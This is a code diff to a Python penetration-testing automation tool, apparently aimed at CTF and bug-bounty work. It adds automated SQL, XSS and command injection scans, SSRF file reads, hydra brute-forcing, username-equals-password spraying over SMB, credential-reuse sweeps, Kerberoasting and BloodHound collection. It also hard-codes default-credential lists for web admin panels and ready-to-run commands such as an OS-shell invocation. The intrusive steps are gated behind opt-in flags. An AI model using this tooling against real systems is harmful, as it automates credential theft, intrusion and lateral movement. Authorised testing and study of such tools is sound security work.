@@ -1360,6 +1360,15 @@ TOOL_LIST = [
     'sslscan', 'testssl.sh', 'testssl', 'openssl', 'netexec', 'crackmapexec',
     'git', 'nbtscan', 'dig', 'whois', 'redis-cli', 'mongo', 'mysql', 'psql',
     'ike-scan', 'responder', 'impacket-getarch', 'evil-winrm',
+    # crawlers / URL & param discovery
+    'katana', 'hakrawler', 'gospider', 'gau', 'waybackurls', 'arjun',
+    'httpx', 'subfinder', 'feroxbuster',
+    # injection / SSRF
+    'dalfox', 'commix', 'ssrfmap', 'interactsh-client',
+    # auth / cred / Windows-AD
+    'kerbrute', 'netexec', 'nxc', 'bloodhound-python',
+    'GetUserSPNs.py', 'impacket-GetUserSPNs', 'GetNPUsers.py', 'impacket-GetNPUsers',
+    'nmblookup',
 ]
 
 def check_tools():
@@ -1743,11 +1752,41 @@ class LootTracker:
         self.urls = []
         self.files = []
         self.notes = []
+        self.recommend = []       # ready-to-run commands for gated/manual follow-up
+        self.usernames = []       # harvested usernames/emails -> seed brute lists
+        self.valid_creds = []     # verified working credentials (dicts)
+        self.candidate_creds = [] # found-but-unverified credentials (dicts)
+        self.chain = []           # ordered kill-chain narrative steps
 
     def add(self, category, item):
         bucket = getattr(self, category, self.notes)
         if item not in bucket:
             bucket.append(item)
+
+    # ── Credential state machine (feeds the reuse sweep + AD collection) ──
+    def add_cred(self, user, pw=None, nthash=None, source='', scope='unknown', verified=False):
+        """Store a structured credential. verified=True => usable for reuse/collection."""
+        rec = {'user': user, 'pw': pw, 'nthash': nthash, 'source': source,
+               'scope': scope, 'verified': verified, 'used': False}
+        bucket = self.valid_creds if verified else self.candidate_creds
+        key = (user, pw, nthash)
+        if not any((c['user'], c['pw'], c['nthash']) == key for c in bucket):
+            bucket.append(rec)
+        disp = f"{user}:{pw}" if pw else (f"{user}#{nthash}" if nthash else user)
+        self.add('creds', f"{disp} [{scope}] ({source})")
+        return rec
+
+    def get_unused_creds(self, verified_only=False):
+        src = self.valid_creds + ([] if verified_only else self.candidate_creds)
+        return [c for c in src if not c.get('used')]
+
+    def mark_used(self, cred):
+        cred['used'] = True
+
+    def add_step(self, text):
+        """Append an ordered step to the kill-chain narrative."""
+        if text not in self.chain:
+            self.chain.append(text)
 
     def scan_output(self, text):
         """Scan text output for interesting patterns."""
@@ -1793,7 +1832,7 @@ class LootTracker:
     def write(self, outfile):
         """Write loot report."""
         lines = ["# Loot Report\n"]
-        for cat in ['creds', 'keys', 'flags', 'shares', 'urls', 'files', 'notes']:
+        for cat in ['creds', 'usernames', 'keys', 'flags', 'shares', 'urls', 'files', 'notes', 'recommend']:
             items = getattr(self, cat)
             if items:
                 lines.append(f"\n## {cat.upper()}")
@@ -2633,6 +2672,768 @@ def run_nuclei(target_url, outdir, tags=None, severity='critical,high,medium', t
     return findings
 
 
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# OFFENSIVE TOOL RUNNERS  (crawlers, injection, SSRF, auth/cred, Windows/AD)
+# ------------------------------------------------------------------------
+# Safe-by-default gating: crawlers / passive enumeration always run; anything
+# that sends injection payloads or brute-forces credentials runs only when
+# active_enabled(args) is true (--active or --ctf). When gated off, a candidate
+# still gets a ready-to-run command recorded via loot.recommend so nothing
+# intrusive fires without opt-in.
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+def active_enabled(args):
+    """Injection/brute tools fire only in --active or --ctf mode."""
+    return bool(getattr(args, 'active', False) or getattr(args, 'ctf', False))
+
+
+def _low_intensity(args):
+    """Bug-bounty mode keeps active tools gentle even when enabled."""
+    return bool(getattr(args, 'bb', False))
+
+
+def _run(cmd, timeout=120, inp=None):
+    """subprocess wrapper: returns (rc, stdout, stderr); never raises."""
+    try:
+        r = subprocess.run(cmd, capture_output=True, text=True,
+                           timeout=timeout, input=inp)
+        return r.returncode, r.stdout or '', r.stderr or ''
+    except Exception as e:
+        return -1, '', str(e)
+
+
+def _first_path(candidates):
+    return next((w for w in candidates if Path(w).exists()), None)
+
+
+def _is_ip(host):
+    return bool(re.match(r'^\d{1,3}(\.\d{1,3}){3}$', host or ''))
+
+
+def _recommend(loot, cmd, why=''):
+    """Record a ready-to-run command for gated/manual follow-up."""
+    if loot:
+        loot.add('recommend', f"{cmd}    # {why}" if why else cmd)
+    print(f"    {C.Cy}[RECOMMEND]{C.Re} {cmd}")
+
+
+# Default small credential lists (fast, CTF-friendly). Bigger lists via flags.
+_DEFAULT_USERLISTS = [
+    '/usr/share/seclists/Usernames/top-usernames-shortlist.txt',
+    '/usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt',
+]
+_DEFAULT_PASSLISTS = [
+    '/usr/share/seclists/Passwords/Common-Credentials/best110.txt',
+    '/usr/share/wordlists/seclists/Passwords/Common-Credentials/best110.txt',
+    '/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt',
+]
+_CRAWL_WORDLISTS = [
+    '/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt',
+    '/usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt',
+    '/usr/share/seclists/Discovery/Web-Content/common.txt',
+]
+
+
+# ── Web crawl → URL / parameter corpus ────────────────────────────────────
+def build_web_corpus(url, port, target, outdir, args, tools, loot=None):
+    """Crawl a web service and build a URL + parameter corpus (always passive).
+    katana → hakrawler → gospider for active crawl; gau/waybackurls for archive
+    URLs (hostname targets only); arjun for hidden parameters. Returns
+    {'urls': set, 'params': set(param-bearing URLs)}."""
+    if getattr(args, 'no_crawl', False):
+        return {'urls': set(), 'params': set()}
+    urls, params = set(), set()
+    host = args.hostname or target
+
+    if tools.get('katana'):
+        info(f"katana crawl {url}")
+        _, out, _ = _run(['katana', '-u', url, '-silent', '-jc', '-d', '3',
+                          '-c', '15', '-timeout', '10'], timeout=180)
+        urls.update(l.strip() for l in out.splitlines() if l.strip().startswith('http'))
+    elif tools.get('hakrawler'):
+        info(f"hakrawler crawl {url}")
+        _, out, _ = _run(['hakrawler', '-d', '3', '-u'], timeout=150, inp=url + '\n')
+        urls.update(l.strip() for l in out.splitlines() if l.strip().startswith('http'))
+    elif tools.get('gospider'):
+        info(f"gospider crawl {url}")
+        _, out, _ = _run(['gospider', '-s', url, '-d', '3', '-q', '--no-redirect'], timeout=180)
+        for l in out.splitlines():
+            m = re.search(r'https?://\S+', l)
+            if m:
+                urls.add(m.group(0).rstrip(']'))
+
+    if not _is_ip(host):
+        if tools.get('gau'):
+            info(f"gau archive URLs for {host}")
+            _, out, _ = _run(['gau', '--threads', '5', host], timeout=120)
+            urls.update(l.strip() for l in out.splitlines() if l.strip().startswith('http'))
+        if tools.get('waybackurls'):
+            info(f"waybackurls for {host}")
+            _, out, _ = _run(['waybackurls', host], timeout=120)
+            urls.update(l.strip() for l in out.splitlines() if l.strip().startswith('http'))
+
+    for u in list(urls):
+        tail = u.split('?', 1)[1] if '?' in u else ''
+        if '=' in tail:
+            params.add(u)
+
+    if tools.get('arjun'):
+        info("arjun parameter discovery")
+        arj_out = outdir / f'arjun_{port}.json'
+        endpoints = [url] + list(dict.fromkeys(u.split('?')[0] for u in list(params)[:5]))
+        for ep in dict.fromkeys(endpoints):
+            _run(['arjun', '-u', ep, '-oJ', str(arj_out), '-t', '10', '--stable'], timeout=120)
+            if arj_out.exists():
+                try:
+                    data = json.loads(arj_out.read_text())
+                    for endpoint, meta in (data.items() if isinstance(data, dict) else []):
+                        found = meta.get('params', []) if isinstance(meta, dict) else []
+                        if found:
+                            params.add(f"{endpoint}?" + '&'.join(f'{p}=1' for p in found))
+                except Exception:
+                    pass
+
+    # Validate liveness with httpx (keeps param URLs even if filtered)
+    if tools.get('httpx') and urls:
+        raw = outdir / f'crawl_raw_{port}.txt'
+        raw.write_text('\n'.join(sorted(urls)))
+        _, out, _ = _run(['httpx', '-silent', '-l', str(raw),
+                         '-mc', '200,201,204,301,302,307,401,403,405,500'], timeout=150)
+        live = {l.strip() for l in out.splitlines() if l.strip().startswith('http')}
+        if live:
+            urls = live | params
+
+    if urls:
+        (outdir / f'crawl_urls_{port}.txt').write_text('\n'.join(sorted(urls)))
+        good(f"crawl: {len(urls)} URLs, {len(params)} parameterized")
+        if loot:
+            for p in sorted(params)[:50]:
+                loot.add('urls', f'[param] {p}')
+    if params:
+        (outdir / f'crawl_params_{port}.txt').write_text('\n'.join(sorted(params)))
+    return {'urls': urls, 'params': params}
+
+
+# ── Injection testing (active-gated) ──────────────────────────────────────
+def run_injection_suite(param_urls, outdir, args, tools, loot=None):
+    """sqlmap (SQLi), dalfox (XSS), commix (command injection) on parameterized
+    URLs. Active-gated: when off, records ready-to-run commands instead."""
+    vulns = []
+    param_urls = sorted(param_urls)
+    if not param_urls:
+        return vulns
+    targets_file = outdir / 'inj_targets.txt'
+    targets_file.write_text('\n'.join(param_urls))
+    sample = param_urls[0]
+
+    if not active_enabled(args):
+        if shutil.which('sqlmap'):
+            _recommend(loot, f"sqlmap -m {targets_file} --batch --random-agent --level=2 --risk=2 --dbs",
+                       "SQLi on discovered parameters")
+        if shutil.which('dalfox'):
+            _recommend(loot, f"dalfox file {targets_file} --skip-bav -o {outdir/'dalfox.txt'}",
+                       "reflected/stored XSS")
+        if shutil.which('commix'):
+            _recommend(loot, f"commix --batch -m {targets_file}", "command injection")
+        return vulns
+
+    subsection("Injection Testing (active)")
+    low = _low_intensity(args)
+
+    # sqlmap
+    if shutil.which('sqlmap'):
+        level, risk = ('1', '1') if low else ('2', '2')
+        info(f"sqlmap on {len(param_urls)} parameterized URLs (level={level} risk={risk})")
+        _, out, _ = _run(['sqlmap', '-m', str(targets_file), '--batch', '--random-agent',
+                         f'--level={level}', f'--risk={risk}', '--smart', '--threads=4',
+                         '--output-dir', str(outdir / 'sqlmap'), '--flush-session'],
+                        timeout=1200 if not low else 600)
+        (outdir / 'sqlmap.txt').write_text(out)
+        if re.search(r'(is vulnerable|following injection point|Parameter:.*\n.*Type:)', out, re.I):
+            for line in out.splitlines():
+                if line.strip().startswith('Parameter:'):
+                    good(f"  SQLi: {line.strip()}")
+                    if loot:
+                        loot.add('creds', f'SQLi injectable: {line.strip()}')
+            vulns.append({'port': 80, 'service': 'http', 'product': 'web app', 'version': '',
+                         'desc': 'SQL injection confirmed by sqlmap', 'cve': '',
+                         'exploit': f'sqlmap -m {targets_file} --batch --dbs --dump',
+                         'severity': 'critical'})
+
+    # dalfox (XSS)
+    if shutil.which('dalfox'):
+        info(f"dalfox XSS scan on {len(param_urls)} URLs")
+        dfx = outdir / 'dalfox.txt'
+        _, out, _ = _run(['dalfox', 'file', str(targets_file), '--skip-bav',
+                         '--no-spinner', '--silence', '-o', str(dfx)],
+                        timeout=600)
+        body = (dfx.read_text() if dfx.exists() else '') + out
+        if re.search(r'\[POC\]|\[VULN\]|triggered', body, re.I):
+            for line in body.splitlines():
+                if '[POC]' in line or '[VULN]' in line:
+                    good(f"  XSS: {line.strip()[:200]}")
+            vulns.append({'port': 80, 'service': 'http', 'product': 'web app', 'version': '',
+                         'desc': 'Cross-site scripting confirmed by dalfox', 'cve': '',
+                         'exploit': f'dalfox file {targets_file}', 'severity': 'high'})
+
+    # commix (command injection)
+    if shutil.which('commix'):
+        info(f"commix command-injection scan on {sample}")
+        _, out, _ = _run(['commix', '--batch', '-u', sample,
+                         '--output-dir', str(outdir / 'commix')], timeout=600)
+        (outdir / 'commix.txt').write_text(out)
+        if re.search(r'(is vulnerable to|command injection|the parameter .* is)', out, re.I):
+            good("  Command injection confirmed by commix")
+            vulns.append({'port': 80, 'service': 'http', 'product': 'web app', 'version': '',
+                         'desc': 'OS command injection confirmed by commix', 'cve': '',
+                         'exploit': f'commix --batch -u "{sample}" --os-shell',
+                         'severity': 'critical'})
+    return vulns
+
+
+# ── SSRF + OOB (active-gated) ──────────────────────────────────────────────
+def run_ssrf_suite(param_urls, outdir, args, tools, loot=None):
+    """ssrfmap against parameterized requests, using an interactsh OOB canary
+    when available. Active-gated. Records ready-to-run commands when off."""
+    vulns = []
+    candidates = sorted(u for u in param_urls
+                        if re.search(r'(url|uri|path|dest|redirect|next|data|reference|site|'
+                                     r'html|feed|host|port|to|out|view|dir|show|file|domain|'
+                                     r'callback|return|page|proxy|load|image)=',
+                                     u, re.I))
+    if not candidates:
+        return vulns
+
+    if not active_enabled(args):
+        if shutil.which('ssrfmap'):
+            _recommend(loot,
+                       f"ssrfmap -r <request.txt> -p <param> -m readfiles,portscan  # e.g. {candidates[0]}",
+                       "SSRF on url-like parameter")
+        return vulns
+
+    subsection("SSRF Testing (active)")
+    # OOB canary
+    oob_domain = ''
+    if getattr(args, 'oob', False) and shutil.which('interactsh-client'):
+        info("interactsh OOB canary (run 'interactsh-client' in another shell to catch hits)")
+        _recommend(loot, "interactsh-client",
+                   "start OOB listener, paste its domain as SSRF/RCE canary")
+
+    if not shutil.which('ssrfmap'):
+        _recommend(loot, f"ssrfmap on {candidates[0]}", "ssrfmap not installed")
+        return vulns
+
+    # ssrfmap needs a raw HTTP request file; synthesize one from a candidate URL.
+    from urllib.parse import urlparse
+    u = candidates[0]
+    pu = urlparse(u)
+    param = next((kv.split('=')[0] for kv in pu.query.split('&') if '=' in kv), 'url')
+    req = outdir / 'ssrf_request.txt'
+    req.write_text(f"GET {pu.path}?{pu.query} HTTP/1.1\r\nHost: {pu.netloc}\r\n"
+                   f"User-Agent: Mozilla/5.0\r\nAccept: */*\r\n\r\n")
+    info(f"ssrfmap on param '{param}' of {pu.netloc}")
+    modules = 'readfiles,portscan' + (',redis,axfr' if not _low_intensity(args) else '')
+    _, out, _ = _run(['ssrfmap', '-r', str(req), '-p', param, '-m', modules],
+                    timeout=600)
+    (outdir / 'ssrfmap.txt').write_text(out)
+    if re.search(r'(200 OK|root:.*:0:0|open port|internal|reachable)', out, re.I):
+        good("  SSRF indicators found by ssrfmap")
+        vulns.append({'port': 80, 'service': 'http', 'product': 'web app', 'version': '',
+                     'desc': f'Possible SSRF via parameter "{param}" (ssrfmap)', 'cve': '',
+                     'exploit': f'ssrfmap -r {req} -p {param} -m readfiles,portscan',
+                     'severity': 'high'})
+    return vulns
+
+
+# ── Credential attacks (active-gated) ─────────────────────────────────────
+_HYDRA_SERVICES = {  # nmap service name -> hydra module
+    'ssh': 'ssh', 'ftp': 'ftp', 'telnet': 'telnet', 'smtp': 'smtp',
+    'mysql': 'mysql', 'postgresql': 'postgres', 'ms-sql-s': 'mssql',
+    'microsoft-ds': 'smb', 'netbios-ssn': 'smb', 'rdp': 'rdp', 'ms-wbt-server': 'rdp',
+    'vnc': 'vnc', 'imap': 'imap', 'pop3': 'pop3', 'ldap': 'ldap2',
+    'rexec': 'rexec', 'rlogin': 'rlogin', 'redis': 'redis',
+}
+
+
+def _spray_userequal_pass(target, outdir, args, loot, context, nxc, domain=''):
+    """username==password spray over ad_users.txt (the Soupedecode foothold).
+    Active-gated; records hits as verified creds and seeds the reuse loop."""
+    vulns = []
+    users_file = outdir / 'ad_users.txt'
+    if not (nxc and users_file.exists()):
+        return vulns
+    if not active_enabled(args):
+        _recommend(loot, f"{Path(nxc).name} smb {target} -u {users_file} -p {users_file} "
+                   f"--no-bruteforce --continue-on-success",
+                   "spray username==password over enumerated users")
+        return vulns
+    info("spray: username==password over ad_users.txt")
+    dom = ['-d', domain] if domain else []
+    _, out, _ = _run([nxc, 'smb', target, '-u', str(users_file), '-p', str(users_file),
+                     '--no-bruteforce', '--continue-on-success'] + dom, timeout=300)
+    (outdir / 'spray_userpass.txt').write_text(out)
+    for m in re.finditer(r'\[\+\]\s+\S+\\([^:\s]+):(\S+)', out):
+        u, p = m.group(1), m.group(2)
+        good(f"  SPRAY HIT: {u}:{p}")
+        if loot:
+            loot.add_cred(u, p, source='spray(user==pass)', scope='smb', verified=True)
+            loot.add_step(f"Foothold: SMB cred {u}:{p} via username==password spray")
+        if context is not None and not context.get('creds'):
+            context['creds'] = f"{u}:{p}"
+        vulns.append({'port': 445, 'service': 'smb', 'product': 'AD', 'version': '',
+                     'desc': f'Weak credential (user==pass): {u}', 'cve': '',
+                     'exploit': f'nxc smb {target} -u {u} -p {p}', 'severity': 'critical'})
+    return vulns
+
+
+def run_credential_attacks(target, services, outdir, args, tools, loot=None, context=None):
+    """hydra/medusa credential brute against discovered auth services. Active-gated.
+    Consumes ad_users.txt when present; records validated creds into loot.valid_creds
+    so the reuse sweep + credentialed AD collection can use them."""
+    vulns = []
+    if not (shutil.which('hydra') or shutil.which('medusa')):
+        return vulns
+    users_file = outdir / 'ad_users.txt'
+    userlist = getattr(args, 'userlist', None) or (str(users_file) if users_file.exists()
+               else _first_path(_DEFAULT_USERLISTS))
+    passlist = getattr(args, 'passlist', None) or _first_path(_DEFAULT_PASSLISTS)
+
+    targets = []
+    for port, svc in services.items():
+        name = svc.get('service', '').lower()
+        mod = next((m for k, m in _HYDRA_SERVICES.items() if k in name), None)
+        if mod:
+            targets.append((port, mod, name))
+    if not targets:
+        return vulns
+
+    if not active_enabled(args):
+        for port, mod, name in targets:
+            _recommend(loot,
+                       f"hydra -L {userlist or '<users>'} -P {passlist or '<pass>'} "
+                       f"-s {port} {target} {mod}",
+                       f"brute {name} on {port}")
+        return vulns
+
+    if not (userlist and passlist):
+        warn("credential attack: no user/pass wordlists found (use --userlist/--passlist)")
+        return vulns
+
+    subsection("Credential Attacks (active)")
+    tasks = '4' if _low_intensity(args) else '16'
+    for port, mod, name in targets:
+        info(f"hydra {mod} on {target}:{port} (users={Path(userlist).name})")
+        out_file = outdir / f'hydra_{mod}_{port}.txt'
+        rc, out, _ = _run(['hydra', '-L', userlist, '-P', passlist, '-t', tasks,
+                          '-f', '-o', str(out_file), '-s', str(port), target, mod],
+                         timeout=900)
+        body = (out_file.read_text() if out_file.exists() else '') + out
+        for m in re.finditer(r'host:.*login:\s*(\S+)\s+password:\s*(\S+)', body):
+            u, p = m.group(1), m.group(2)
+            good(f"  VALID: {name}://{target}:{port}  {u}:{p}")
+            if loot:
+                loot.add_cred(u, p, source=f'hydra:{name}', scope=name, verified=True)
+                loot.add_step(f"Foothold: {name} cred {u}:{p} via hydra")
+            if context is not None and not context.get('creds'):
+                context['creds'] = f"{u}:{p}"
+            vulns.append({'port': port, 'service': name, 'product': mod, 'version': '',
+                         'desc': f'Valid credentials found via hydra: {u}:{p}',
+                         'cve': '', 'exploit': f'{name} login {u}:{p}',
+                         'severity': 'critical'})
+    return vulns
+
+
+# ── Windows / AD / SMB deep enumeration ───────────────────────────────────
+def _nxc_bin():
+    return shutil.which('nxc') or shutil.which('netexec') or shutil.which('crackmapexec')
+
+
+_REUSE_PROTOS = [  # nxc protocol -> service-name substrings / default ports implying it
+    ('smb',   ('microsoft-ds', 'netbios-ssn', 'smb'), (445, 139)),
+    ('ssh',   ('ssh',), (22,)),
+    ('winrm', ('winrm', 'wsman'), (5985, 5986)),
+    ('mssql', ('ms-sql',), (1433,)),
+    ('ldap',  ('ldap',), (389, 636)),
+    ('ftp',   ('ftp',), (21,)),
+]
+
+
+def run_credential_reuse(target, services, outdir, args, tools, loot=None, context=None):
+    """The #1 recurring win in real engagements: take every discovered credential
+    and try it against every other discovered auth service (read-only auth check via
+    netexec). Widens each cred's scope and seeds context['creds'] for AD collection."""
+    vulns = []
+    if loot is None:
+        return vulns
+    creds = loot.get_unused_creds(verified_only=False)
+    if not creds:
+        return vulns
+    # Only sweep once we're in active mode or creds were user-supplied
+    if not (active_enabled(args) or getattr(args, 'creds', '')):
+        return vulns
+    nxc = _nxc_bin()
+    svc_vals = [s.get('service', '').lower() for s in services.values()]
+    protos = []
+    for proto, subs, ports in _REUSE_PROTOS:
+        if any(any(sub in v for sub in subs) for v in svc_vals) or any(p in services for p in ports):
+            protos.append(proto)
+    if not protos:
+        return vulns
+    if not nxc:
+        _recommend(loot, f"nxc {'/'.join(protos)} {target} -u <user> -p <pass>   # each found cred",
+                   "verify credential reuse across services")
+        return vulns
+
+    subsection("Credential Reuse Sweep")
+    domain = context.get('domain', '') if context else ''
+    for c in creds:
+        user, pw = c.get('user'), c.get('pw')
+        if not user or pw is None:
+            continue
+        loot.mark_used(c)
+        worked = []
+        for proto in protos:
+            cmd = [nxc, proto, target, '-u', user, '-p', pw]
+            if domain and proto in ('smb', 'ldap', 'winrm', 'mssql'):
+                cmd += ['-d', domain]
+            elif proto in ('smb', 'mssql'):
+                cmd += ['--local-auth']
+            _, out, _ = _run(cmd, timeout=60)
+            if re.search(r'\[\+\]', out):
+                worked.append(proto)
+        if worked:
+            good(f"  REUSE: {user}:{pw} valid on {', '.join(worked)}")
+            c['scope'] = '+'.join(worked)
+            c['verified'] = True
+            if c not in loot.valid_creds:
+                loot.valid_creds.append(c)
+            if context is not None and not context.get('creds'):
+                context['creds'] = f"{user}:{pw}"
+            loot.add_step(f"Lateral: {user} reused on {', '.join(worked)}")
+            vulns.append({'port': 445, 'service': 'auth', 'product': 'reuse', 'version': '',
+                         'desc': f'Credential reuse: {user} works on {", ".join(worked)}',
+                         'cve': '', 'exploit': f'nxc {worked[0]} {target} -u {user} -p {pw}',
+                         'severity': 'high'})
+    return vulns
+
+
+def run_ad_enum_unauth(target, services, outdir, args, tools, loot=None, domain='', context=None):
+    """Unauthenticated AD/SMB enumeration: null/guest shares + RID-brute (read-only,
+    runs by default) and username==password spray (active-gated). Writes ad_users.txt
+    consumed by the cred attacks/spray. Returns structured vulns (e.g. SMB signing)."""
+    vulns = []
+    context = context if context is not None else {}
+    svc_names = {p: s.get('service', '').lower() for p, s in services.items()}
+    has_smb = any(('microsoft-ds' in n or 'netbios-ssn' in n or 'smb' in n)
+                  for n in svc_names.values()) or 445 in services or 139 in services
+    has_ldap = any('ldap' in n for n in svc_names.values()) or 389 in services or 636 in services
+    has_kerberos = any('kerberos' in n for n in svc_names.values()) or 88 in services
+    nxc = _nxc_bin()
+    if not (has_smb or has_ldap or has_kerberos):
+        return vulns
+
+    subsection("Windows / AD / SMB Enumeration (unauthenticated)")
+    if nxc and has_smb:
+        info(f"{Path(nxc).name} smb {target} (null session enum)")
+        _, out, _ = _run([nxc, 'smb', target, '-u', '', '-p', '', '--shares'], timeout=120)
+        (outdir / 'nxc_smb_null.txt').write_text(out)
+        for line in out.splitlines():
+            if 'READ' in line or 'WRITE' in line:
+                good(f"  {line.strip()}")
+                if loot:
+                    loot.add('shares', line.strip())
+        dom = re.search(r'\(domain:([^)]+)\)', out)
+        if dom and not domain:
+            domain = dom.group(1).strip()
+        if domain:
+            context['domain'] = domain
+        if re.search(r'signing:\s*False', out, re.I):
+            vulns.append({'port': 445, 'service': 'smb', 'product': 'SMB', 'version': '',
+                         'desc': 'SMB signing not required (relay possible)', 'cve': '',
+                         'exploit': 'ntlmrelayx.py -tf targets.txt -smb2support',
+                         'severity': 'medium'})
+        # RID-brute (read-only) -> ad_users.txt
+        _, uout, _ = _run([nxc, 'smb', target, '-u', 'guest', '-p', '', '--rid-brute'], timeout=180)
+        if 'SidTypeUser' not in uout:
+            _, uout2, _ = _run([nxc, 'smb', target, '-u', '', '-p', '', '--rid-brute'], timeout=180)
+            uout += uout2
+        users = sorted(set(re.findall(r'\\([A-Za-z0-9._$-]+)\s+\(SidTypeUser\)', uout)))
+        users = [u for u in users if not u.endswith('$')]
+        if users:
+            (outdir / 'ad_users.txt').write_text('\n'.join(users))
+            good(f"  RID-brute users ({len(users)}): {', '.join(users[:15])}")
+            context['users'] = users
+            if loot:
+                for u in users:
+                    loot.add('usernames', u)
+                loot.add('notes', f"AD users (RID-brute): {len(users)}")
+
+    if has_kerberos and domain and shutil.which('kerbrute'):
+        users_file = outdir / 'ad_users.txt'
+        ulist = str(users_file) if users_file.exists() else (
+                getattr(args, 'userlist', None) or _first_path(_DEFAULT_USERLISTS))
+        if ulist and active_enabled(args):
+            info(f"kerbrute userenum ({domain})")
+            _, out, _ = _run(['kerbrute', 'userenum', '-d', domain, '--dc', target, ulist], timeout=300)
+            (outdir / 'kerbrute.txt').write_text(out)
+            for m in re.finditer(r'VALID USERNAME:\s*(\S+)', out):
+                good(f"  valid user: {m.group(1)}")
+                if loot:
+                    loot.add('usernames', m.group(1).split('@')[0])
+        elif ulist:
+            _recommend(loot, f"kerbrute userenum -d {domain} --dc {target} {ulist}",
+                       "validate AD usernames")
+
+    vulns += _spray_userequal_pass(target, outdir, args, loot, context, nxc, domain)
+    return vulns
+
+
+def run_ad_collect_authed(target, services, outdir, args, tools, loot=None, domain='', context=None):
+    """Credentialed AD collection (Kerberoast, BloodHound), fed by a validated cred
+    from the reuse sweep / cred attacks (context['creds']) or explicit --creds."""
+    vulns = []
+    context = context if context is not None else {}
+    domain = domain or context.get('domain', '')
+    creds = getattr(args, 'creds', '') or context.get('creds', '')
+    svc_names = {p: s.get('service', '').lower() for p, s in services.items()}
+    has_ldap = any('ldap' in n for n in svc_names.values()) or 389 in services or 636 in services
+    has_kerberos = any('kerberos' in n for n in svc_names.values()) or 88 in services
+    has_winrm = 5985 in services or 5986 in services or any('winrm' in n for n in svc_names.values())
+    has_mssql = any('ms-sql' in n for n in svc_names.values()) or 1433 in services
+    nxc = _nxc_bin()
+
+    if creds and domain:
+        user, pw = (creds.split(':', 1) + [''])[:2]
+        spn_bin = shutil.which('GetUserSPNs.py') or shutil.which('impacket-GetUserSPNs')
+        if spn_bin:
+            info(f"Kerberoast (GetUserSPNs) as {user}")
+            _run([spn_bin, f'{domain}/{user}:{pw}', '-dc-ip', target, '-request',
+                 '-outputfile', str(outdir / 'kerberoast.hash')], timeout=180)
+            khash = outdir / 'kerberoast.hash'
+            if khash.exists() and khash.stat().st_size:
+                good("  Kerberoastable hashes captured -> kerberoast.hash")
+                if loot:
+                    loot.add('keys', 'Kerberoast TGS hashes (crack: hashcat -m 13100 kerberoast.hash)')
+                    loot.add_step("AD: Kerberoast TGS captured -> hashcat -m 13100")
+                vulns.append({'port': 88, 'service': 'kerberos', 'product': 'AD', 'version': '',
+                             'desc': 'Kerberoastable service accounts (TGS hashes captured)',
+                             'cve': '', 'exploit': 'hashcat -m 13100 kerberoast.hash wordlist',
+                             'severity': 'high'})
+        if shutil.which('bloodhound-python') and active_enabled(args):
+            info(f"bloodhound-python collection as {user}")
+            _run(['bloodhound-python', '-u', user, '-p', pw, '-d', domain,
+                 '-ns', target, '-c', 'All', '--zip'], timeout=600)
+            good("  BloodHound data collected (.zip)")
+            if loot:
+                loot.add('notes', 'BloodHound collection complete')
+                loot.add_step("AD: BloodHound collected -> shortest path to Domain Admin")
+        elif shutil.which('bloodhound-python'):
+            _recommend(loot, f"bloodhound-python -u {user} -p '{pw}' -d {domain} -ns {target} -c All --zip",
+                       "map AD attack paths")
+    elif has_ldap or has_kerberos:
+        _recommend(loot, f"nxc ldap {target} -u <user> -p <pass> --bloodhound -c All",
+                   "credentialed AD collection once you have a cred")
+
+    if has_winrm:
+        _recommend(loot, f"evil-winrm -i {target} -u <user> -p <pass>",
+                   "interactive WinRM shell once you have creds")
+    if has_mssql and nxc:
+        _recommend(loot, f"{Path(nxc).name} mssql {target} -u <user> -p <pass> --local-auth",
+                   "MSSQL access / xp_cmdshell")
+    return vulns
+
+
+# ── Web foothold heuristics (HTML-intel passive; default-cred/LFI/IDOR gated) ──
+_LFI_PARAM_HINTS = ('file', 'page', 'path', 'include', 'inc', 'doc', 'document',
+                    'template', 'tpl', 'lang', 'view', 'cat', 'dir', 'load', 'read',
+                    'download', 'filename', 'name', 'conf', 'config')
+_IDOR_PARAM_HINTS = ('id', 'uid', 'user', 'userid', 'account', 'acct', 'order', 'orderid',
+                     'msg', 'no', 'num', 'number', 'doc', 'docid', 'pid', 'item', 'record',
+                     'invoice', 'ticket', 'key')
+# product signature (matched against whatweb output) -> (login path, [(user,pass)...])
+_DEFAULT_CRED_PANELS = {
+    'jenkins':    ('/', [('admin', 'admin')]),
+    'tomcat':     ('/manager/html', [('tomcat', 'tomcat'), ('admin', 'admin'), ('tomcat', 's3cret'), ('admin', 'tomcat')]),
+    'phpmyadmin': ('/index.php', [('root', ''), ('root', 'root'), ('root', 'toor')]),
+    'grafana':    ('/login', [('admin', 'admin')]),
+    'glassfish':  ('/', [('admin', 'admin')]),
+    'wildfly':    ('/', [('admin', 'admin')]),
+    'jboss':      ('/', [('admin', 'admin')]),
+    'sonarqube':  ('/', [('admin', 'admin')]),
+    'zabbix':     ('/', [('Admin', 'zabbix')]),
+    'gitlab':     ('/', [('root', '5iveL!fe')]),
+}
+
+
+def _html_intel(url, port, outdir, loot):
+    """Passive: harvest emails/usernames + tech/version banners from base page+headers."""
+    if not shutil.which('curl') or loot is None:
+        return
+    _, body, _ = _run(['curl', '-sk', '-L', '--max-time', '10', url], timeout=15)
+    _, hdrs, _ = _run(['curl', '-skIL', '--max-time', '10', url], timeout=15)
+    blob = (body or '') + '\n' + (hdrs or '')
+    if blob.strip():
+        (outdir / f'html_intel_{port}.txt').write_text(blob[:40000])
+    for e in sorted(set(re.findall(r'[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}', blob)))[:30]:
+        loot.add('usernames', e)
+        loot.add('usernames', e.split('@')[0])
+    for m in re.finditer(r'(?i)(?:powered by|<meta name=["\']generator["\'] content=["\'])'
+                         r'\s*([A-Za-z][\w .\-]{2,40})', blob):
+        loot.add('notes', f"web tech: {m.group(1).strip()}")
+    for name, val in re.findall(r'(?im)^(X-Powered-By|Server|X-Generator):\s*(.+)$', hdrs or ''):
+        loot.add('notes', f"header {name}: {val.strip()[:80]}")
+
+
+def run_web_foothold_suite(url, port, corpus, outdir, args, tools, loot=None):
